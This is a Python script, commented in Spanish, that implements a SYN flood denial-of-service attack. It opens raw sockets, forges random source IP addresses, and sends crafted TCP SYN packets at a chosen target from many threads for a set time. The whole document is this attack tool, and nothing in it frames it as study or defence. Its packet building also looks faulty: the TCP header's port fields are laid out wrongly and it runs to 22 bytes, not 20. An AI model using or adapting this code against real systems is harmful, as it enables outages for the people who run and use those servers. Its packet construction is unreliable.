import socket
import random
import threading
import time

class SYNFlood:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.is_running = False

    def attack(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Generar IP falsa
                fake_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
                
                # Construir paquete SYN malicioso
                packet = self._craft_syn_packet(fake_ip)
                s.sendto(packet, (self.target, self.port))
            except:
                pass

    def _craft_syn_packet(self, src_ip):
        # Cabecera IP (falsa)
        ip_header = bytearray()
        ip_header += b'\x45\x00\x00\x28'  # Versión, IHL, TOS | Longitud total
        ip_header += b'\xab\xcd\x00\x00'  # ID, Flags, Fragment Offset
        ip_header += b'\x40\x06\x00\x00'  # TTL, Protocolo (TCP) | Checksum (0)
        ip_header += socket.inet_aton(src_ip)  # IP Origen (falsa)
        ip_header += socket.inet_aton(self.target)  # IP Destino

        # Cabecera TCP (SYN)
        tcp_header = bytearray()
        tcp_header += b'\x00\x00\x00\x00'  # Puerto Origen (aleatorio)
        tcp_header += socket.htons(self.port).to_bytes(2, 'big')  # Puerto Destino
        tcp_header += b'\x00\x00\x00\x00'  # Número de secuencia
        tcp_header += b'\x00\x00\x00\x00'  # Número de ACK
        tcp_header += b'\x50\x02\x00\x00'  # Data Offset, Flags (SYN) | Tamaño ventana
        tcp_header += b'\x00\x00\x00\x00'  # Checksum (0) | Puntero urgente

        return ip_header + tcp_header

    def start(self):
        self.is_running = True
        for _ in range(self.threads):
            threading.Thread(target=self.attack).start()
        threading.Thread(target=self.stop_after_duration).start()

    def stop_after_duration(self):
        time.sleep(self.duration)
        self.stop()

    def stop(self):
        self.is_running = False